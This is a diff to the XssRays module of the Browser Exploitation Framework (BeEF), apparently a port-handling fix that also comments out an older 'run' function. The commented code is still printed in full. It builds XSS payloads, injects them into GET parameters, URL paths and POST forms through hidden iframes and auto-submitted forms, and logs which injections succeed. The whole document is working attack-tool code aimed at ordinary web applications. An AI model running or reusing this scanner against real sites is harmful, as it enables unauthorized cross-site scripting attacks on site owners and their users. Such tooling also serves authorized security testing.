@@ -171,13 +171,24 @@ beef.net.xssrays = {
                         if (!this.vectors[i].url) {
                             continue;
                         }
+
                         if (this.vectors[i].url) {
-                            console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
-                            this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], params, true);//params
+                            if(target.port == null || target.port == ""){
+                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
+                                this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], params, true);//params
+                            }else{
+                                console.log("starting XSS on GET params of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
+                                this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], params, true);//params
+                            }
                         }
                         if (this.vectors[i].path) {
-                            console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
-                            this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], null, true);//paths
+                            if(target.port == null || target.port == ""){
+                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + target.pathname + "]");
+                                this.temp_run(target.protocol + '//' + target.hostname + target.pathname, 'GET', this.vectors[i], null, true);//paths
+                            }else{
+                                console.log("starting XSS on URI PATH of [" + target.href + "], passing url [" + target.protocol + '//' + target.hostname + ':' +target.port + target.pathname + "]");
+                                this.temp_run(target.protocol + '//' + target.hostname + ':' + target.port + target.pathname, 'GET', this.vectors[i], null, true);//paths
+                            }
                         }
                     }
                 }
@@ -363,144 +374,144 @@ beef.net.xssrays = {
         });
     },
 
-    // old mechanisms...not called anymore in the code...see instead "temp_run"
-    run: function(url, method, vector, params, urlencode, excludeList) {
-        this.stack.push(function() {
-            if (excludeList) {
-                excludeList = new RegExp(excludeList.join('|'), 'i');
-            } else {
-                excludeList = new RegExp();
-            }
-            var self = this;
-            beef.net.xssrays.uniqueID++;
-            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
-            var poc = url;
-            var exploit = '';
-
-            var logger = 'location=window.name';
-
-            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
-            if (params == null) {
-                console.log("[XssRays] NULL params");
-                var filename = beef.net.xssrays.fileName(url);
-                exploit = vector.input.replace(/XSS/g, logger);
-                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
-                exploit = vector.input.replace(/XSS/g, 'alert(1)');
-                poc = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
-            } else if (method === 'GET') {
-                console.log("[XssRays] params [" + params.toString() + "]");
-                url = beef.net.xssrays.fileName(url);
-                poc = url;
-                if (!/[?]/.test(url)) {
-                    url += '?';
-                    poc += '?'
-                }
-                var paramsPos = 0;
-                for (var i in params) {
-                    if (params.hasOwnProperty(i)) {
-                        if (excludeList.test(i)) {
-                            url += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
-                            poc += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
-                            continue;
-                        }
-
-                        if (paramsPos % 2 == 1 && vector.input2) {
-                            exploit = vector.input2.replace(/XSS/g, logger);
-                        } else {
-                            exploit = vector.input.replace(/XSS/g, logger);
-                        }
-                        url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
-                        if (paramsPos % 2 == 1 && vector.input2) {
-                            exploit = vector.input2.replace(/XSS/g, 'alert(1)');
-                        } else {
-                            exploit = vector.input.replace(/XSS/g, 'alert(1)');
-                        }
-                        poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
-                        paramsPos++;
-                    }
-                }
-            }
-            var ieLoader = "document.getElementById('" + 'ray' + beef.net.xssrays.uniqueID + "').ieonload()";
-            if (beef.net.xssrays.isIE()) {
-                try {
-                    var iframe = document.createElement('<iframe name="' + location + '#xss' + '" onload="' + ieLoader + '">');
-                } catch (e) {
-                    var iframe = document.createElement('iframe');
-                }
-            } else {
-                var iframe = document.createElement('iframe');
-            }
-            iframe.style.display = 'none';
-            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
-            iframe.time = beef.net.xssrays.timestamp();
-            iframe.name = location + '#xss';
-            iframe.ieonload = iframe.onload = function() {
-                //TODO: throws Permission denied errors,
-                console.log("[XssRays] iframe onload: id [" + iframe.id + "] - name [" + iframe.name + "]");
-                console.log("[XssRays] this.contentWindow.location => " + this.contentWindow.location);
-                try {
-                    if (this.contentWindow.location.hash.slice(1) == 'xss') {
-                        this.logger(this.id);
-                        if (document.getElementById(this.id)) {
-                            beef.net.xssrays.complete();
-                            document.body.removeChild(iframe);
-                            return;
-                        }
-                    }
-                } catch(e) {
-                    console.log("[XssRays] iframe onload: id [" + iframe.id + "] - EXCEPTION [" + e.toString() + "]");
-                }
-
-                var that = this;
-                setTimeout(function() {
-                    if (document.getElementById(that.id)) {
-                        document.body.removeChild(that);
-                        beef.net.xssrays.complete();
-                    }
-                }, this.errorTimeout)
-            }
-
-            if (method === 'GET') {
-                iframe.src = url;
-                document.body.appendChild(iframe);
-            } else if (method === 'POST') {
-                var form = '<form action="' + beef.net.xssrays.escape(url) + '" method="post" id="frm">';
-                poc += '?';
-                var paramsPos = 0;
-                for (var i in params) {
-                    if (params.hasOwnProperty(i)) {
-                        if (excludeList.test(i)) {
-                            form += '<textarea name="' + i + '">' + beef.net.xssrays.escape(params[i]) + '<\/textarea>';
-                            continue;
-                        } else {
-
-                            if (paramsPos % 2 == 1 && vector.input2) {
-                                exploit = beef.net.xssrays.escape(vector.input2.replace(/XSS/g, logger));
-                            }
-                            else {
-                                exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, logger));
-                            }
-                            form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
-                            if (paramsPos % 2 == 1 && vector.input2) {
-                                exploit = vector.input2.replace(/XSS/g, 'alert(1)');
-                            }
-                            else {
-                                exploit = vector.input.replace(/XSS/g, 'alert(1)');
-                            }
-                            poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
-                            paramsPos++;
-                        }
-                    }
-                }
-                form += '<\/form>';
-                document.body.appendChild(iframe);
-                iframe.contentWindow.document.writeln(form);
-                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
-            }
-            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = poc;
-            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
-        });
-    },
+//    // old mechanisms...not called anymore in the code...see instead "temp_run"
+//    run: function(url, method, vector, params, urlencode, excludeList) {
+//        this.stack.push(function() {
+//            if (excludeList) {
+//                excludeList = new RegExp(excludeList.join('|'), 'i');
+//            } else {
+//                excludeList = new RegExp();
+//            }
+//            var self = this;
+//            beef.net.xssrays.uniqueID++;
+//            console.log('[XssRays] Processing vector [' + vector.name + "], URL [" + url + "]");
+//            var poc = url;
+//            var exploit = '';
+//
+//            var logger = 'location=window.name';
+//
+//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID] = {vector:vector,url:url,params:params};
+//            if (params == null) {
+//                console.log("[XssRays] NULL params");
+//                var filename = beef.net.xssrays.fileName(url);
+//                exploit = vector.input.replace(/XSS/g, logger);
+//                url = url.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
+//                exploit = vector.input.replace(/XSS/g, 'alert(1)');
+//                poc = poc.replace(filename, filename + '/' + (urlencode ? encodeURIComponent(exploit) : exploit) + '/');
+//            } else if (method === 'GET') {
+//                console.log("[XssRays] params [" + params.toString() + "]");
+//                url = beef.net.xssrays.fileName(url);
+//                poc = url;
+//                if (!/[?]/.test(url)) {
+//                    url += '?';
+//                    poc += '?'
+//                }
+//                var paramsPos = 0;
+//                for (var i in params) {
+//                    if (params.hasOwnProperty(i)) {
+//                        if (excludeList.test(i)) {
+//                            url += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
+//                            poc += i + '=' + (urlencode ? encodeURIComponent(params[i]) : params[i]) + '&';
+//                            continue;
+//                        }
+//
+//                        if (paramsPos % 2 == 1 && vector.input2) {
+//                            exploit = vector.input2.replace(/XSS/g, logger);
+//                        } else {
+//                            exploit = vector.input.replace(/XSS/g, logger);
+//                        }
+//                        url += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+//                        if (paramsPos % 2 == 1 && vector.input2) {
+//                            exploit = vector.input2.replace(/XSS/g, 'alert(1)');
+//                        } else {
+//                            exploit = vector.input.replace(/XSS/g, 'alert(1)');
+//                        }
+//                        poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+//                        paramsPos++;
+//                    }
+//                }
+//            }
+//            var ieLoader = "document.getElementById('" + 'ray' + beef.net.xssrays.uniqueID + "').ieonload()";
+//            if (beef.net.xssrays.isIE()) {
+//                try {
+//                    var iframe = document.createElement('<iframe name="' + location + '#xss' + '" onload="' + ieLoader + '">');
+//                } catch (e) {
+//                    var iframe = document.createElement('iframe');
+//                }
+//            } else {
+//                var iframe = document.createElement('iframe');
+//            }
+//            iframe.style.display = 'none';
+//            iframe.id = 'ray' + beef.net.xssrays.uniqueID;
+//            iframe.time = beef.net.xssrays.timestamp();
+//            iframe.name = location + '#xss';
+//            iframe.ieonload = iframe.onload = function() {
+//                //TODO: throws Permission denied errors,
+//                console.log("[XssRays] iframe onload: id [" + iframe.id + "] - name [" + iframe.name + "]");
+//                console.log("[XssRays] this.contentWindow.location => " + this.contentWindow.location);
+//                try {
+//                    if (this.contentWindow.location.hash.slice(1) == 'xss') {
+//                        this.logger(this.id);
+//                        if (document.getElementById(this.id)) {
+//                            beef.net.xssrays.complete();
+//                            document.body.removeChild(iframe);
+//                            return;
+//                        }
+//                    }
+//                } catch(e) {
+//                    console.log("[XssRays] iframe onload: id [" + iframe.id + "] - EXCEPTION [" + e.toString() + "]");
+//                }
+//
+//                var that = this;
+//                setTimeout(function() {
+//                    if (document.getElementById(that.id)) {
+//                        document.body.removeChild(that);
+//                        beef.net.xssrays.complete();
+//                    }
+//                }, this.errorTimeout)
+//            }
+//
+//            if (method === 'GET') {
+//                iframe.src = url;
+//                document.body.appendChild(iframe);
+//            } else if (method === 'POST') {
+//                var form = '<form action="' + beef.net.xssrays.escape(url) + '" method="post" id="frm">';
+//                poc += '?';
+//                var paramsPos = 0;
+//                for (var i in params) {
+//                    if (params.hasOwnProperty(i)) {
+//                        if (excludeList.test(i)) {
+//                            form += '<textarea name="' + i + '">' + beef.net.xssrays.escape(params[i]) + '<\/textarea>';
+//                            continue;
+//                        } else {
+//
+//                            if (paramsPos % 2 == 1 && vector.input2) {
+//                                exploit = beef.net.xssrays.escape(vector.input2.replace(/XSS/g, logger));
+//                            }
+//                            else {
+//                                exploit = beef.net.xssrays.escape(vector.input.replace(/XSS/g, logger));
+//                            }
+//                            form += '<textarea name="' + i + '">' + exploit + '<\/textarea>';
+//                            if (paramsPos % 2 == 1 && vector.input2) {
+//                                exploit = vector.input2.replace(/XSS/g, 'alert(1)');
+//                            }
+//                            else {
+//                                exploit = vector.input.replace(/XSS/g, 'alert(1)');
+//                            }
+//                            poc += i + '=' + (urlencode ? encodeURIComponent(exploit) : exploit) + '&';
+//                            paramsPos++;
+//                        }
+//                    }
+//                }
+//                form += '<\/form>';
+//                document.body.appendChild(iframe);
+//                iframe.contentWindow.document.writeln(form);
+//                iframe.contentWindow.document.writeln('<script>document.createElement("form").submit.apply(document.forms[0]);<\/script>');
+//            }
+//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.poc = poc;
+//            beef.net.xssrays.rays[beef.net.xssrays.uniqueID].vector.method = method;
+//        });
+//    },
 
     // run the jobs (temp_run functions added to the stack), and clean the shit (iframes) from the DOM after a timeout value
     runJobs: function() {
@@ -512,7 +523,7 @@ beef.net.xssrays = {
             for (var i = 0; i < document.getElementsByTagName('iframe').length; i++) {
                 var iframe = document.getElementsByTagName('iframe')[i];
                 numOfConnections++;
-                console.log("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
+                //console.log("runJobs parseInt(this.timestamp()) [" + parseInt(beef.net.xssrays.timestamp()) + "], parseInt(iframe.time) [" + parseInt(iframe.time) + "]");
                 if (parseInt(beef.net.xssrays.timestamp()) - parseInt(iframe.time) > 5) {
                     if (iframe) {
                         beef.net.xssrays.complete();
